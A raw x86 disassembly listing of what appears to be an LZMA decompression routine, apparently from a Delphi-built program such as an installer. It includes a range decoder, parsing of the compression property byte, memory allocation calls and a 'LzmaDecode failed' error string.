  407bb2:	8b da                	mov    %edx,%ebx
  407bb4:	8b f0                	mov    %eax,%esi
  407bb6:	8b c6                	mov    %esi,%eax
  407bb8:	e8 1b 00 00 00       	call   0x407bd8
  407bbd:	33 d2                	xor    %edx,%edx
  407bbf:	8b c6                	mov    %esi,%eax
  407bc1:	e8 52 ad ff ff       	call   0x402918
  407bc6:	84 db                	test   %bl,%bl
  407bc8:	74 07                	je     0x407bd1
  407bca:	8b c6                	mov    %esi,%eax
  407bcc:	e8 33 af ff ff       	call   0x402b04
  407bd1:	8b c6                	mov    %esi,%eax
  407bd3:	5e                   	pop    %esi
  407bd4:	5b                   	pop    %ebx
  407bd5:	c3                   	ret
  407bd6:	8b c0                	mov    %eax,%eax
  407bd8:	53                   	push   %ebx
  407bd9:	8b d8                	mov    %eax,%ebx
  407bdb:	33 c0                	xor    %eax,%eax
  407bdd:	89 43 64             	mov    %eax,0x64(%ebx)
  407be0:	8b 43 60             	mov    0x60(%ebx),%eax
  407be3:	85 c0                	test   %eax,%eax
  407be5:	74 12                	je     0x407bf9
  407be7:	68 00 80 00 00       	push   $0x8000
  407bec:	6a 00                	push   $0x0
  407bee:	50                   	push   %eax
  407bef:	e8 08 c9 ff ff       	call   0x4044fc
  407bf4:	33 c0                	xor    %eax,%eax
  407bf6:	89 43 60             	mov    %eax,0x60(%ebx)
  407bf9:	5b                   	pop    %ebx
  407bfa:	c3                   	ret
  407bfb:	90                   	nop
  407bfc:	53                   	push   %ebx
  407bfd:	56                   	push   %esi
  407bfe:	8b f1                	mov    %ecx,%esi
  407c00:	8b d8                	mov    %eax,%ebx
  407c02:	8d 43 68             	lea    0x68(%ebx),%eax
  407c05:	89 02                	mov    %eax,(%edx)
  407c07:	33 c0                	xor    %eax,%eax
  407c09:	89 06                	mov    %eax,(%esi)
  407c0b:	80 7b 0c 00          	cmpb   $0x0,0xc(%ebx)
  407c0f:	75 19                	jne    0x407c2a
  407c11:	8d 53 68             	lea    0x68(%ebx),%edx
  407c14:	b9 00 00 01 00       	mov    $0x10000,%ecx
  407c19:	8b 43 08             	mov    0x8(%ebx),%eax
  407c1c:	ff 53 04             	call   *0x4(%ebx)
  407c1f:	89 06                	mov    %eax,(%esi)
  407c21:	83 3e 00             	cmpl   $0x0,(%esi)
  407c24:	75 04                	jne    0x407c2a
  407c26:	c6 43 0c 01          	movb   $0x1,0xc(%ebx)
  407c2a:	5e                   	pop    %esi
  407c2b:	5b                   	pop    %ebx
  407c2c:	c3                   	ret
  407c2d:	8d 40 00             	lea    0x0(%eax),%eax
  407c30:	53                   	push   %ebx
  407c31:	56                   	push   %esi
  407c32:	57                   	push   %edi
  407c33:	83 c4 f0             	add    $0xfffffff0,%esp
  407c36:	8b d8                	mov    %eax,%ebx
  407c38:	8b d4                	mov    %esp,%edx
  407c3a:	b9 05 00 00 00       	mov    $0x5,%ecx
  407c3f:	8b 43 08             	mov    0x8(%ebx),%eax
  407c42:	ff 53 04             	call   *0x4(%ebx)
  407c45:	83 f8 05             	cmp    $0x5,%eax
  407c48:	74 0a                	je     0x407c54
  407c4a:	b8 01 00 00 00       	mov    $0x1,%eax
  407c4f:	e8 f4 fe ff ff       	call   0x407b48
  407c54:	8d 43 10             	lea    0x10(%ebx),%eax
  407c57:	33 c9                	xor    %ecx,%ecx
  407c59:	ba 50 00 00 00       	mov    $0x50,%edx
  407c5e:	e8 19 ab ff ff       	call   0x40277c
  407c63:	6a 05                	push   $0x5
  407c65:	8d 44 24 0c          	lea    0xc(%esp),%eax
  407c69:	50                   	push   %eax
  407c6a:	8d 44 24 14          	lea    0x14(%esp),%eax
  407c6e:	50                   	push   %eax
  407c6f:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  407c73:	8d 43 10             	lea    0x10(%ebx),%eax
  407c76:	ba 50 00 00 00       	mov    $0x50,%edx
  407c7b:	e8 80 0b 00 00       	call   0x408800
  407c80:	85 c0                	test   %eax,%eax
  407c82:	74 0a                	je     0x407c8e
  407c84:	b8 03 00 00 00       	mov    $0x3,%eax
  407c89:	e8 ba fe ff ff       	call   0x407b48
  407c8e:	81 7c 24 0c 00 00 00 	cmpl   $0x2000000,0xc(%esp)
  407c95:	02 
  407c96:	76 0a                	jbe    0x407ca2
  407c98:	b8 07 00 00 00       	mov    $0x7,%eax
  407c9d:	e8 a6 fe ff ff       	call   0x407b48
  407ca2:	8b 74 24 08          	mov    0x8(%esp),%esi
  407ca6:	03 74 24 0c          	add    0xc(%esp),%esi
  407caa:	3b 73 64             	cmp    0x64(%ebx),%esi
  407cad:	74 27                	je     0x407cd6
  407caf:	8b c3                	mov    %ebx,%eax
  407cb1:	e8 22 ff ff ff       	call   0x407bd8
  407cb6:	6a 04                	push   $0x4
  407cb8:	68 00 10 00 00       	push   $0x1000
  407cbd:	56                   	push   %esi
  407cbe:	6a 00                	push   $0x0
  407cc0:	e8 2f c8 ff ff       	call   0x4044f4
  407cc5:	8b f8                	mov    %eax,%edi
  407cc7:	89 7b 60             	mov    %edi,0x60(%ebx)
  407cca:	85 ff                	test   %edi,%edi
  407ccc:	75 05                	jne    0x407cd3
  407cce:	e8 01 db ff ff       	call   0x4057d4
  407cd3:	89 73 64             	mov    %esi,0x64(%ebx)
  407cd6:	8b 4b 60             	mov    0x60(%ebx),%ecx
  407cd9:	03 4c 24 08          	add    0x8(%esp),%ecx
  407cdd:	8d 43 10             	lea    0x10(%ebx),%eax
  407ce0:	8b 53 60             	mov    0x60(%ebx),%edx
  407ce3:	e8 68 0b 00 00       	call   0x408850
  407ce8:	c6 43 0d 01          	movb   $0x1,0xd(%ebx)
  407cec:	83 c4 10             	add    $0x10,%esp
  407cef:	5f                   	pop    %edi
  407cf0:	5e                   	pop    %esi
  407cf1:	5b                   	pop    %ebx
  407cf2:	c3                   	ret
  407cf3:	90                   	nop
  407cf4:	55                   	push   %ebp
  407cf5:	8b ec                	mov    %esp,%ebp
  407cf7:	83 c4 e8             	add    $0xffffffe8,%esp
  407cfa:	53                   	push   %ebx
  407cfb:	56                   	push   %esi
  407cfc:	57                   	push   %edi
  407cfd:	33 db                	xor    %ebx,%ebx
  407cff:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  407d02:	8b f1                	mov    %ecx,%esi
  407d04:	8b fa                	mov    %edx,%edi
  407d06:	8b d8                	mov    %eax,%ebx
  407d08:	33 c0                	xor    %eax,%eax
  407d0a:	55                   	push   %ebp
  407d0b:	68 a1 7d 40 00       	push   $0x407da1
  407d10:	64 ff 30             	push   %fs:(%eax)
  407d13:	64 89 20             	mov    %esp,%fs:(%eax)
  407d16:	80 7b 0d 00          	cmpb   $0x0,0xd(%ebx)
  407d1a:	75 07                	jne    0x407d23
  407d1c:	8b c3                	mov    %ebx,%eax
  407d1e:	e8 0d ff ff ff       	call   0x407c30
  407d23:	c7 45 f8 a4 7b 40 00 	movl   $0x407ba4,-0x8(%ebp)
  407d2a:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  407d2d:	56                   	push   %esi
  407d2e:	8d 45 f4             	lea    -0xc(%ebp),%eax
  407d31:	50                   	push   %eax
  407d32:	8b cf                	mov    %edi,%ecx
  407d34:	8d 55 f8             	lea    -0x8(%ebp),%edx
  407d37:	8d 43 10             	lea    0x10(%ebx),%eax
  407d3a:	e8 25 04 00 00       	call   0x408164
  407d3f:	8b d8                	mov    %eax,%ebx
  407d41:	8b c3                	mov    %ebx,%eax
  407d43:	83 e8 01             	sub    $0x1,%eax
  407d46:	72 32                	jb     0x407d7a
  407d48:	74 02                	je     0x407d4c
  407d4a:	eb 0c                	jmp    0x407d58
  407d4c:	b8 05 00 00 00       	mov    $0x5,%eax
  407d51:	e8 f2 fd ff ff       	call   0x407b48
  407d56:	eb 22                	jmp    0x407d7a
  407d58:	8d 45 f0             	lea    -0x10(%ebp),%eax
  407d5b:	50                   	push   %eax
  407d5c:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  407d5f:	c6 45 ec 00          	movb   $0x0,-0x14(%ebp)
  407d63:	8d 55 e8             	lea    -0x18(%ebp),%edx
  407d66:	33 c9                	xor    %ecx,%ecx
  407d68:	b8 b8 7d 40 00       	mov    $0x407db8,%eax
  407d6d:	e8 72 d3 ff ff       	call   0x4050e4
  407d72:	8b 45 f0             	mov    -0x10(%ebp),%eax
  407d75:	e8 56 fd ff ff       	call   0x407ad0
  407d7a:	8b 45 f4             	mov    -0xc(%ebp),%eax
  407d7d:	3b c6                	cmp    %esi,%eax
  407d7f:	74 0a                	je     0x407d8b
  407d81:	b8 06 00 00 00       	mov    $0x6,%eax
  407d86:	e8 bd fd ff ff       	call   0x407b48
  407d8b:	33 c0                	xor    %eax,%eax
  407d8d:	5a                   	pop    %edx
  407d8e:	59                   	pop    %ecx
  407d8f:	59                   	pop    %ecx
  407d90:	64 89 10             	mov    %edx,%fs:(%eax)
  407d93:	68 a8 7d 40 00       	push   $0x407da8
  407d98:	8d 45 f0             	lea    -0x10(%ebp),%eax
  407d9b:	e8 f8 b3 ff ff       	call   0x403198
  407da0:	c3                   	ret
  407da1:	e9 56 b0 ff ff       	jmp    0x402dfc
  407da6:	eb f0                	jmp    0x407d98
  407da8:	5f                   	pop    %edi
  407da9:	5e                   	pop    %esi
  407daa:	5b                   	pop    %ebx
  407dab:	8b e5                	mov    %ebp,%esp
  407dad:	5d                   	pop    %ebp
  407dae:	c3                   	ret
  407daf:	00 ff                	add    %bh,%bh
  407db1:	ff                   	(bad)
  407db2:	ff                   	(bad)
  407db3:	ff 16                	call   *(%esi)
  407db5:	00 00                	add    %al,(%eax)
  407db7:	00 4c 7a 6d          	add    %cl,0x6d(%edx,%edi,2)
  407dbb:	61                   	popa
  407dbc:	44                   	inc    %esp
  407dbd:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  407dc1:	65 20 66 61          	and    %ah,%gs:0x61(%esi)
  407dc5:	69 6c 65 64 20 28 25 	imul   $0x64252820,0x64(%ebp,%eiz,2),%ebp
  407dcc:	64 
  407dcd:	29 00                	sub    %eax,(%eax)
  407dcf:	00 c6                	add    %al,%dh
  407dd1:	40                   	inc    %eax
  407dd2:	0d 00 c6 40 0c       	or     $0xc40c600,%eax
  407dd7:	00 c3                	add    %al,%bl
  407dd9:	8d 40 00             	lea    0x0(%eax),%eax
  407ddc:	53                   	push   %ebx
  407ddd:	8b d8                	mov    %eax,%ebx
  407ddf:	56                   	push   %esi
  407de0:	51                   	push   %ecx
  407de1:	8b 03                	mov    (%ebx),%eax
  407de3:	3b 43 04             	cmp    0x4(%ebx),%eax
  407de6:	75 27                	jne    0x407e0f
  407de8:	8b cc                	mov    %esp,%ecx
  407dea:	8b 73 10             	mov    0x10(%ebx),%esi
  407ded:	8b d3                	mov    %ebx,%edx
  407def:	8b c6                	mov    %esi,%eax
  407df1:	ff 16                	call   *(%esi)
  407df3:	89 43 14             	mov    %eax,0x14(%ebx)
  407df6:	8b 0b                	mov    (%ebx),%ecx
  407df8:	03 0c 24             	add    (%esp),%ecx
  407dfb:	89 4b 04             	mov    %ecx,0x4(%ebx)
  407dfe:	83 3c 24 00          	cmpl   $0x0,(%esp)
  407e02:	75 0b                	jne    0x407e0f
  407e04:	c7 43 18 01 00 00 00 	movl   $0x1,0x18(%ebx)
  407e0b:	b0 ff                	mov    $0xff,%al
  407e0d:	eb 06                	jmp    0x407e15
  407e0f:	8b 13                	mov    (%ebx),%edx
  407e11:	ff 03                	incl   (%ebx)
  407e13:	8a 02                	mov    (%edx),%al
  407e15:	5a                   	pop    %edx
  407e16:	5e                   	pop    %esi
  407e17:	5b                   	pop    %ebx
  407e18:	c3                   	ret
  407e19:	90                   	nop
  407e1a:	90                   	nop
  407e1b:	90                   	nop
  407e1c:	53                   	push   %ebx
  407e1d:	8b d8                	mov    %eax,%ebx
  407e1f:	33 c0                	xor    %eax,%eax
  407e21:	56                   	push   %esi
  407e22:	89 43 04             	mov    %eax,0x4(%ebx)
  407e25:	33 d2                	xor    %edx,%edx
  407e27:	89 03                	mov    %eax,(%ebx)
  407e29:	33 c9                	xor    %ecx,%ecx
  407e2b:	89 53 18             	mov    %edx,0x18(%ebx)
  407e2e:	89 4b 0c             	mov    %ecx,0xc(%ebx)
  407e31:	c7 43 08 ff ff ff ff 	movl   $0xffffffff,0x8(%ebx)
  407e38:	33 f6                	xor    %esi,%esi
  407e3a:	8b c3                	mov    %ebx,%eax
  407e3c:	e8 9b ff ff ff       	call   0x407ddc
  407e41:	8b 4b 0c             	mov    0xc(%ebx),%ecx
  407e44:	33 d2                	xor    %edx,%edx
  407e46:	c1 e1 08             	shl    $0x8,%ecx
  407e49:	8a d0                	mov    %al,%dl
  407e4b:	0b d1                	or     %ecx,%edx
  407e4d:	46                   	inc    %esi
  407e4e:	83 fe 05             	cmp    $0x5,%esi
  407e51:	89 53 0c             	mov    %edx,0xc(%ebx)
  407e54:	7c e4                	jl     0x407e3a
  407e56:	5e                   	pop    %esi
  407e57:	5b                   	pop    %ebx
  407e58:	c3                   	ret
  407e59:	90                   	nop
  407e5a:	90                   	nop
  407e5b:	90                   	nop
  407e5c:	53                   	push   %ebx
  407e5d:	56                   	push   %esi
  407e5e:	57                   	push   %edi
  407e5f:	55                   	push   %ebp
  407e60:	51                   	push   %ecx
  407e61:	89 04 24             	mov    %eax,(%esp)
  407e64:	8b 04 24             	mov    (%esp),%eax
  407e67:	33 ed                	xor    %ebp,%ebp
  407e69:	8b fa                	mov    %edx,%edi
  407e6b:	85 ff                	test   %edi,%edi
  407e6d:	8b 58 08             	mov    0x8(%eax),%ebx
  407e70:	8b 04 24             	mov    (%esp),%eax
  407e73:	8b 70 0c             	mov    0xc(%eax),%esi
  407e76:	74 30                	je     0x407ea8
  407e78:	d1 eb                	shr    $1,%ebx
  407e7a:	03 ed                	add    %ebp,%ebp
  407e7c:	3b de                	cmp    %esi,%ebx
  407e7e:	77 05                	ja     0x407e85
  407e80:	2b f3                	sub    %ebx,%esi
  407e82:	83 cd 01             	or     $0x1,%ebp
  407e85:	81 fb 00 00 00 01    	cmp    $0x1000000,%ebx
  407e8b:	73 16                	jae    0x407ea3
  407e8d:	c1 e3 08             	shl    $0x8,%ebx
  407e90:	8b 04 24             	mov    (%esp),%eax
  407e93:	e8 44 ff ff ff       	call   0x407ddc
  407e98:	33 d2                	xor    %edx,%edx
  407e9a:	c1 e6 08             	shl    $0x8,%esi
  407e9d:	8a d0                	mov    %al,%dl
  407e9f:	0b d6                	or     %esi,%edx
  407ea1:	8b f2                	mov    %edx,%esi
  407ea3:	4f                   	dec    %edi
  407ea4:	85 ff                	test   %edi,%edi
  407ea6:	75 d0                	jne    0x407e78
  407ea8:	8b 0c 24             	mov    (%esp),%ecx
  407eab:	89 59 08             	mov    %ebx,0x8(%ecx)
  407eae:	8b 04 24             	mov    (%esp),%eax
  407eb1:	89 70 0c             	mov    %esi,0xc(%eax)
  407eb4:	8b c5                	mov    %ebp,%eax
  407eb6:	5a                   	pop    %edx
  407eb7:	5d                   	pop    %ebp
  407eb8:	5f                   	pop    %edi
  407eb9:	5e                   	pop    %esi
  407eba:	5b                   	pop    %ebx
  407ebb:	c3                   	ret
  407ebc:	53                   	push   %ebx
  407ebd:	8b da                	mov    %edx,%ebx
  407ebf:	0f b7 08             	movzwl (%eax),%ecx
  407ec2:	8b 53 08             	mov    0x8(%ebx),%edx
  407ec5:	c1 ea 0b             	shr    $0xb,%edx
  407ec8:	0f af d1             	imul   %ecx,%edx
  407ecb:	3b 53 0c             	cmp    0xc(%ebx),%edx
  407ece:	76 3b                	jbe    0x407f0b
  407ed0:	89 53 08             	mov    %edx,0x8(%ebx)
  407ed3:	b9 00 08 00 00       	mov    $0x800,%ecx
  407ed8:	0f b7 10             	movzwl (%eax),%edx
  407edb:	2b ca                	sub    %edx,%ecx
  407edd:	c1 f9 05             	sar    $0x5,%ecx
  407ee0:	66 01 08             	add    %cx,(%eax)
  407ee3:	81 7b 08 00 00 00 01 	cmpl   $0x1000000,0x8(%ebx)
  407eea:	73 1b                	jae    0x407f07
  407eec:	8b c3                	mov    %ebx,%eax
  407eee:	e8 e9 fe ff ff       	call   0x407ddc
  407ef3:	25 ff 00 00 00       	and    $0xff,%eax
  407ef8:	8b 53 0c             	mov    0xc(%ebx),%edx
  407efb:	c1 e2 08             	shl    $0x8,%edx
  407efe:	0b c2                	or     %edx,%eax
  407f00:	89 43 0c             	mov    %eax,0xc(%ebx)
  407f03:	c1 63 08 08          	shll   $0x8,0x8(%ebx)
  407f07:	33 c0                	xor    %eax,%eax
  407f09:	5b                   	pop    %ebx
  407f0a:	c3                   	ret
  407f0b:	29 53 08             	sub    %edx,0x8(%ebx)
  407f0e:	29 53 0c             	sub    %edx,0xc(%ebx)
  407f11:	0f b7 10             	movzwl (%eax),%edx
  407f14:	c1 fa 05             	sar    $0x5,%edx
  407f17:	66 29 10             	sub    %dx,(%eax)
  407f1a:	81 7b 08 00 00 00 01 	cmpl   $0x1000000,0x8(%ebx)
  407f21:	73 1a                	jae    0x407f3d
  407f23:	8b c3                	mov    %ebx,%eax
  407f25:	e8 b2 fe ff ff       	call   0x407ddc
  407f2a:	8b 4b 0c             	mov    0xc(%ebx),%ecx
  407f2d:	33 d2                	xor    %edx,%edx
  407f2f:	c1 e1 08             	shl    $0x8,%ecx
  407f32:	8a d0                	mov    %al,%dl
  407f34:	0b d1                	or     %ecx,%edx
  407f36:	89 53 0c             	mov    %edx,0xc(%ebx)
  407f39:	c1 63 08 08          	shll   $0x8,0x8(%ebx)
  407f3d:	b8 01 00 00 00       	mov    $0x1,%eax
  407f42:	5b                   	pop    %ebx
  407f43:	c3                   	ret
  407f44:	53                   	push   %ebx
  407f45:	56                   	push   %esi
  407f46:	57                   	push   %edi
  407f47:	55                   	push   %ebp
  407f48:	51                   	push   %ecx
  407f49:	8b e9                	mov    %ecx,%ebp
  407f4b:	89 14 24             	mov    %edx,(%esp)
  407f4e:	8b f8                	mov    %eax,%edi
  407f50:	bb 01 00 00 00       	mov    $0x1,%ebx
  407f55:	8b 34 24             	mov    (%esp),%esi
  407f58:	85 f6                	test   %esi,%esi
  407f5a:	74 15                	je     0x407f71
  407f5c:	8d 04 5f             	lea    (%edi,%ebx,2),%eax
  407f5f:	8b d5                	mov    %ebp,%edx
  407f61:	e8 56 ff ff ff       	call   0x407ebc
  407f66:	03 db                	add    %ebx,%ebx
  407f68:	4e                   	dec    %esi
  407f69:	03 c3                	add    %ebx,%eax
  407f6b:	85 f6                	test   %esi,%esi
  407f6d:	8b d8                	mov    %eax,%ebx
  407f6f:	75 eb                	jne    0x407f5c
  407f71:	8b 0c 24             	mov    (%esp),%ecx
  407f74:	b8 01 00 00 00       	mov    $0x1,%eax
  407f79:	d3 e0                	shl    %cl,%eax
  407f7b:	50                   	push   %eax
  407f7c:	8b c3                	mov    %ebx,%eax
  407f7e:	5a                   	pop    %edx
  407f7f:	2b c2                	sub    %edx,%eax
  407f81:	5a                   	pop    %edx
  407f82:	5d                   	pop    %ebp
  407f83:	5f                   	pop    %edi
  407f84:	5e                   	pop    %esi
  407f85:	5b                   	pop    %ebx
  407f86:	c3                   	ret
  407f87:	90                   	nop
  407f88:	53                   	push   %ebx
  407f89:	56                   	push   %esi
  407f8a:	57                   	push   %edi
  407f8b:	55                   	push   %ebp
  407f8c:	83 c4 f8             	add    $0xfffffff8,%esp
  407f8f:	33 ff                	xor    %edi,%edi
  407f91:	33 f6                	xor    %esi,%esi
  407f93:	8b e8                	mov    %eax,%ebp
  407f95:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  407f99:	89 14 24             	mov    %edx,(%esp)
  407f9c:	3b 34 24             	cmp    (%esp),%esi
  407f9f:	bb 01 00 00 00       	mov    $0x1,%ebx
  407fa4:	7d 1d                	jge    0x407fc3
  407fa6:	8d 44 5d 00          	lea    0x0(%ebp,%ebx,2),%eax
  407faa:	8b 54 24 04          	mov    0x4(%esp),%edx
  407fae:	e8 09 ff ff ff       	call   0x407ebc
  407fb3:	03 db                	add    %ebx,%ebx
  407fb5:	03 d8                	add    %eax,%ebx
  407fb7:	8b ce                	mov    %esi,%ecx
  407fb9:	d3 e0                	shl    %cl,%eax
  407fbb:	0b f8                	or     %eax,%edi
  407fbd:	46                   	inc    %esi
  407fbe:	3b 34 24             	cmp    (%esp),%esi
  407fc1:	7c e3                	jl     0x407fa6
  407fc3:	8b c7                	mov    %edi,%eax
  407fc5:	59                   	pop    %ecx
  407fc6:	5a                   	pop    %edx
  407fc7:	5d                   	pop    %ebp
  407fc8:	5f                   	pop    %edi
  407fc9:	5e                   	pop    %esi
  407fca:	5b                   	pop    %ebx
  407fcb:	c3                   	ret
  407fcc:	53                   	push   %ebx
  407fcd:	56                   	push   %esi
  407fce:	57                   	push   %edi
  407fcf:	8b fa                	mov    %edx,%edi
  407fd1:	8b f0                	mov    %eax,%esi
  407fd3:	bb 01 00 00 00       	mov    $0x1,%ebx
  407fd8:	8d 04 5e             	lea    (%esi,%ebx,2),%eax
  407fdb:	8b d7                	mov    %edi,%edx
  407fdd:	e8 da fe ff ff       	call   0x407ebc
  407fe2:	03 db                	add    %ebx,%ebx
  407fe4:	0b c3                	or     %ebx,%eax
  407fe6:	8b d8                	mov    %eax,%ebx
  407fe8:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  407fee:	7c e8                	jl     0x407fd8
  407ff0:	8b c3                	mov    %ebx,%eax
  407ff2:	5f                   	pop    %edi
  407ff3:	5e                   	pop    %esi
  407ff4:	5b                   	pop    %ebx
  407ff5:	c3                   	ret
  407ff6:	90                   	nop
  407ff7:	90                   	nop
  407ff8:	53                   	push   %ebx
  407ff9:	56                   	push   %esi
  407ffa:	57                   	push   %edi
  407ffb:	55                   	push   %ebp
  407ffc:	51                   	push   %ecx
  407ffd:	88 0c 24             	mov    %cl,(%esp)
  408000:	8b fa                	mov    %edx,%edi
  408002:	8b f0                	mov    %eax,%esi
  408004:	bb 01 00 00 00       	mov    $0x1,%ebx
  408009:	0f b6 2c 24          	movzbl (%esp),%ebp
  40800d:	c1 fd 07             	sar    $0x7,%ebp
  408010:	8b d3                	mov    %ebx,%edx
  408012:	83 e5 01             	and    $0x1,%ebp
  408015:	03 d2                	add    %edx,%edx
  408017:	8b c5                	mov    %ebp,%eax
  408019:	d0 24 24             	shlb   $1,(%esp)
  40801c:	c1 e0 08             	shl    $0x8,%eax
  40801f:	03 c0                	add    %eax,%eax
  408021:	03 c6                	add    %esi,%eax
  408023:	03 c2                	add    %edx,%eax
  408025:	8b d7                	mov    %edi,%edx
  408027:	05 00 02 00 00       	add    $0x200,%eax
  40802c:	e8 8b fe ff ff       	call   0x407ebc
  408031:	03 db                	add    %ebx,%ebx
  408033:	0b d8                	or     %eax,%ebx
  408035:	3b c5                	cmp    %ebp,%eax
  408037:	74 22                	je     0x40805b
  408039:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  40803f:	7d 22                	jge    0x408063
  408041:	8d 04 5e             	lea    (%esi,%ebx,2),%eax
  408044:	8b d7                	mov    %edi,%edx
  408046:	e8 71 fe ff ff       	call   0x407ebc
  40804b:	03 db                	add    %ebx,%ebx
  40804d:	0b c3                	or     %ebx,%eax
  40804f:	8b d8                	mov    %eax,%ebx
  408051:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  408057:	7c e8                	jl     0x408041
  408059:	eb 08                	jmp    0x408063
  40805b:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  408061:	7c a6                	jl     0x408009
  408063:	8b c3                	mov    %ebx,%eax
  408065:	5a                   	pop    %edx
  408066:	5d                   	pop    %ebp
  408067:	5f                   	pop    %edi
  408068:	5e                   	pop    %esi
  408069:	5b                   	pop    %ebx
  40806a:	c3                   	ret
  40806b:	90                   	nop
  40806c:	53                   	push   %ebx
  40806d:	56                   	push   %esi
  40806e:	57                   	push   %edi
  40806f:	8b f9                	mov    %ecx,%edi
  408071:	8b f2                	mov    %edx,%esi
  408073:	8b d8                	mov    %eax,%ebx
  408075:	8b d6                	mov    %esi,%edx
  408077:	8b c3                	mov    %ebx,%eax
  408079:	e8 3e fe ff ff       	call   0x407ebc
  40807e:	85 c0                	test   %eax,%eax
  408080:	75 1a                	jne    0x40809c
  408082:	8b c7                	mov    %edi,%eax
  408084:	8b ce                	mov    %esi,%ecx
  408086:	c1 e0 03             	shl    $0x3,%eax
  408089:	ba 03 00 00 00       	mov    $0x3,%edx
  40808e:	03 c0                	add    %eax,%eax
  408090:	03 c3                	add    %ebx,%eax
  408092:	83 c0 04             	add    $0x4,%eax
  408095:	e8 aa fe ff ff       	call   0x407f44
  40809a:	eb 42                	jmp    0x4080de
  40809c:	8d 43 02             	lea    0x2(%ebx),%eax
  40809f:	8b d6                	mov    %esi,%edx
  4080a1:	e8 16 fe ff ff       	call   0x407ebc
  4080a6:	85 c0                	test   %eax,%eax
  4080a8:	75 1f                	jne    0x4080c9
  4080aa:	8b c7                	mov    %edi,%eax
  4080ac:	8b ce                	mov    %esi,%ecx
  4080ae:	c1 e0 03             	shl    $0x3,%eax
  4080b1:	ba 03 00 00 00       	mov    $0x3,%edx
  4080b6:	03 c0                	add    %eax,%eax
  4080b8:	03 c3                	add    %ebx,%eax
  4080ba:	05 04 01 00 00       	add    $0x104,%eax
  4080bf:	e8 80 fe ff ff       	call   0x407f44
  4080c4:	83 c0 08             	add    $0x8,%eax
  4080c7:	eb 15                	jmp    0x4080de
  4080c9:	8d 83 04 02 00 00    	lea    0x204(%ebx),%eax
  4080cf:	8b ce                	mov    %esi,%ecx
  4080d1:	ba 08 00 00 00       	mov    $0x8,%edx
  4080d6:	e8 69 fe ff ff       	call   0x407f44
  4080db:	83 c0 10             	add    $0x10,%eax
  4080de:	5f                   	pop    %edi
  4080df:	5e                   	pop    %esi
  4080e0:	5b                   	pop    %ebx
  4080e1:	c3                   	ret
  4080e2:	90                   	nop
  4080e3:	90                   	nop
  4080e4:	53                   	push   %ebx
  4080e5:	56                   	push   %esi
  4080e6:	83 f9 05             	cmp    $0x5,%ecx
  4080e9:	7d 08                	jge    0x4080f3
  4080eb:	b8 01 00 00 00       	mov    $0x1,%eax
  4080f0:	5e                   	pop    %esi
  4080f1:	5b                   	pop    %ebx
  4080f2:	c3                   	ret
  4080f3:	8a 0a                	mov    (%edx),%cl
  4080f5:	80 f9 e1             	cmp    $0xe1,%cl
  4080f8:	72 08                	jb     0x408102
  4080fa:	b8 01 00 00 00       	mov    $0x1,%eax
  4080ff:	5e                   	pop    %esi
  408100:	5b                   	pop    %ebx
  408101:	c3                   	ret
  408102:	33 db                	xor    %ebx,%ebx
  408104:	80 f9 2d             	cmp    $0x2d,%cl
  408107:	89 58 08             	mov    %ebx,0x8(%eax)
  40810a:	72 0b                	jb     0x408117
  40810c:	ff 40 08             	incl   0x8(%eax)
  40810f:	80 c1 d3             	add    $0xd3,%cl
  408112:	80 f9 2d             	cmp    $0x2d,%cl
  408115:	73 f5                	jae    0x40810c
  408117:	33 db                	xor    %ebx,%ebx
  408119:	80 f9 09             	cmp    $0x9,%cl
  40811c:	89 58 04             	mov    %ebx,0x4(%eax)
  40811f:	72 0b                	jb     0x40812c
  408121:	ff 40 04             	incl   0x4(%eax)
  408124:	80 c1 f7             	add    $0xf7,%cl
  408127:	80 f9 09             	cmp    $0x9,%cl
  40812a:	73 f5                	jae    0x408121
  40812c:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  408132:	89 08                	mov    %ecx,(%eax)
  408134:	33 c9                	xor    %ecx,%ecx
  408136:	33 db                	xor    %ebx,%ebx
  408138:	42                   	inc    %edx
  408139:	89 48 0c             	mov    %ecx,0xc(%eax)
  40813c:	0f b6 32             	movzbl (%edx),%esi
  40813f:	8b cb                	mov    %ebx,%ecx
  408141:	43                   	inc    %ebx
  408142:	c1 e1 03             	shl    $0x3,%ecx
  408145:	42                   	inc    %edx
  408146:	d3 e6                	shl    %cl,%esi
  408148:	01 70 0c             	add    %esi,0xc(%eax)
  40814b:	83 fb 04             	cmp    $0x4,%ebx
  40814e:	7c ec                	jl     0x40813c
  408150:	83 78 0c 00          	cmpl   $0x0,0xc(%eax)
  408154:	75 07                	jne    0x40815d
  408156:	c7 40 0c 01 00 00 00 	movl   $0x1,0xc(%eax)
  40815d:	33 c0                	xor    %eax,%eax
  40815f:	5e                   	pop    %esi
  408160:	5b                   	pop    %ebx
  408161:	c3                   	ret
  408162:	90                   	nop
  408163:	90                   	nop
  408164:	55                   	push   %ebp
  408165:	8b ec                	mov    %esp,%ebp
  408167:	81 c4 7c ff ff ff    	add    $0xffffff7c,%esp
  40816d:	53                   	push   %ebx
  40816e:	56                   	push   %esi
  40816f:	57                   	push   %edi
  408170:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  408173:	89 55 f8             	mov    %edx,-0x8(%ebp)
  408176:	89 45 fc             	mov    %eax,-0x4(%ebp)
  408179:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40817c:	33 c9                	xor    %ecx,%ecx
  40817e:	8b 50 10             	mov    0x10(%eax),%edx
  408181:	89 55 f0             	mov    %edx,-0x10(%ebp)
  408184:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  408187:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40818a:	ba 01 00 00 00       	mov    $0x1,%edx
  40818f:	8b 48 08             	mov    0x8(%eax),%ecx
  408192:	d3 e2                	shl    %cl,%edx
  408194:	4a                   	dec    %edx
  408195:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  408198:	ba 01 00 00 00       	mov    $0x1,%edx
  40819d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4081a0:	8b 48 04             	mov    0x4(%eax),%ecx
  4081a3:	d3 e2                	shl    %cl,%edx
